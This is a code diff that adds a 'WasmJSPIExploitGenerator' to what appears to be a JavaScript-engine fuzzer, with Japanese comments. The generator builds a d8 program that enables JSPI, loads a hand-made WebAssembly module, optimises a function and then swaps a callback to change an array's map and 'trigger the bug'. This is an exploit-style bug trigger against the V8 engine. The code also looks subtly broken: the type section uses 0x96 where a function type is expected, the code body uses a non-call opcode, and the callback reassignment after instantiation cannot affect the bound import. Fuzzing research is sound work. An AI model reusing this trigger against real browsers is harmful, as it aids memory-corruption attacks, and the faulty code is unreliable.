@@ -2251,6 +2251,78 @@ public let CodeGenerators: [CodeGenerator] = [
         }, catchBody: { error in
             b.loadUndefined()
         })
+    },
+
+    // JSPIエクスプロイトのジェネレータを追加
+    CodeGenerator("WasmJSPIExploitGenerator") { b in 
+        b.buildTryCatchFinally(tryBody: {
+            // JSPIを有効化
+            b.callMethod("enableJSPI", on: b.getProperty("test", of: b.loadBuiltin("d8")))
+            
+            let WebAssembly = b.loadBuiltin("WebAssembly")
+            
+            // コールバック関数を作成
+            let callback = b.buildPlainFunction(with: .parameters(n: 0)) { _ in 
+                b.loadUndefined()
+            }
+            
+            // WASMモジュールのバイトコード (import "js" "jscb" + export "stub")
+            let wasmBytes = [
+                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,  // マジックナンバー + バージョン
+                0x01, 0x04, 0x01, 0x96, 0x00, 0x00,  // Type section
+                0x02, 0x0b, 0x01, 0x02, 0x6a, 0x73, 0x04, 0x6a, 0x73, 0x63, 0x62, 0x00, 0x00,  // Import section
+                0x03, 0x02, 0x01, 0x00,  // Function section
+                0x07, 0x08, 0x01, 0x04, 0x73, 0x74, 0x75, 0x62, 0x00, 0x01,  // Export section
+                0x0a, 0x06, 0x01, 0x04, 0x00, 0x16, 0x00, 0x0b  // Code section
+            ].map { Int64($0) }
+            
+            // WASMモジュールを作成
+            let wasmArray = b.createIntArray(with: wasmBytes)
+            let uint8Array = b.construct(b.loadBuiltin("Uint8Array"), withArgs: [wasmArray])
+            let module = b.construct(b.getProperty("Module", of: WebAssembly), withArgs: [uint8Array])
+            
+            // インポートオブジェクトを作成
+            let importObj = b.createObject(with: [
+                "js": b.createObject(with: [
+                    "jscb": callback
+                ])
+            ])
+            
+            // インスタンスを作成
+            let instance = b.construct(b.getProperty("Instance", of: WebAssembly), withArgs: [module, importObj])
+            
+            // 安定したマップを持つ配列を作成
+            let array = b.createArray(with: [b.loadFloat(12.34)])
+            b.setProperty("fork_map", of: array, to: b.loadInt(1337))
+            
+            // デオプト対象の関数を作成
+            let deoptTarget = b.buildPlainFunction(with: .parameters(n: 0)) { _ in
+                // WASMスタック上でJSコールバックを呼び出し
+                let stub = b.getProperty("stub", of: b.getProperty("exports", of: instance))
+                let promisedStub = b.callFunction(b.getProperty("promising", of: WebAssembly), withArgs: [stub])
+                b.callFunction(promisedStub, withArgs: [])
+                
+                // 配列アクセス
+                b.getElement(0, of: array)
+            }
+            
+            // 関数を最適化
+            b.buildRepeatLoop(n: 10000) { _ in
+                b.callFunction(deoptTarget, withArgs: [])
+            }
+            
+            // コールバックを変更して配列のマップを変更するように
+            let newCallback = b.buildPlainFunction(with: .parameters(n: 0)) { _ in
+                b.setElement(0, of: array, to: b.loadString("foo"))
+            }
+            b.reassign(callback, to: newCallback)
+            
+            // バグをトリガー
+            b.callFunction(deoptTarget, withArgs: [])
+            
+        }, catchBody: { error in
+            b.loadUndefined()
+        })
     }
 ]
 
